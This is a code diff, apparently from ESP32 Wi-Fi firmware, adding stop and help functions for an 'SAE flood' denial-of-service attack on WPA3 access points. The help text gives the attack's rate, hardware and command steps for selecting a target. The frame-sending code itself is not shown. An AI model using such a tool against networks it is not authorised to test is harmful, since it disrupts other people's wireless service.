+void wifi_manager_stop_sae_flood(void) {
+    if (!sae_flood_running) {
+        printf("SAE flood attack not running\n");
+        TERMINAL_VIEW_ADD_TEXT("SAE flood attack not running\n");
+        return;
+    }
+    
+    sae_flood_running = false;
+    
+    // Wait for tasks to finish
+    if (sae_flood_task_handle) {
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    if (sae_flood_display_task_handle) {
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    
+    wifi_manager_stop_monitor_mode();
+    printf("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+    TERMINAL_VIEW_ADD_TEXT("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+}
+
+void wifi_manager_sae_flood_help(void) {
+    printf("SAE Flood Attack - Overwhelms WPA3 APs with commit frames\n");
+    TERMINAL_VIEW_ADD_TEXT("SAE Flood Attack - Overwhelms WPA3 APs with commit frames\n");
+    printf("Rate: 100+ frames/sec with randomization\n");
+    TERMINAL_VIEW_ADD_TEXT("Rate: 100+ frames/sec with randomization\n");
+    printf("Requirements: ESP32-C5/C6, WPA3 AP selected\n");
+    TERMINAL_VIEW_ADD_TEXT("Requirements: ESP32-C5/C6, WPA3 AP selected\n");
+    printf("Usage: scanap -> list -a -> select -a <index> -> saeflood\n");
+    TERMINAL_VIEW_ADD_TEXT("Usage: scanap -> list -a -> select -a <index> -> saeflood\n");
+    printf("Commands: saeflood, stopsaeflood, saefloodhelp\n");
+    TERMINAL_VIEW_ADD_TEXT("Commands: saeflood, stopsaeflood, saefloodhelp\n");
 }
